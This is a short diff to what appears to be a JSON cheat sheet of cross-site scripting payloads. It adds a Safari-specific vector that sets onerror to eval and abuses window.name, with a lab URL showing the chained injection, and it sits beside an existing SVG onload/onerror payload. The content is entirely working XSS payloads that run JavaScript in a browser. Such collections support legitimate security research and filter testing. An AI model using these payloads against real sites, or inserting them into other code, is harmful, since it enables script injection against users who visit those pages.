@@ -269,5 +269,11 @@
     "description": "SVG onerror and XSS new constructor",
     "code": "<svg onload=onerror=eval;new'\"-alert\\x281\\x29//'>",
     "browsers": ["safari"]
+  },
+  {
+    "description": "onerror and new operator on window name",
+    "code": "<script>onerror=eval,new name</script>",
+    "browsers": ["safari"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href=%22//subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%3Eonerror=eval,new%20name%3C/script%3E%22target=%27%22-alert(1)//%27%3Etest%3C/a%3E"
   }
 ]
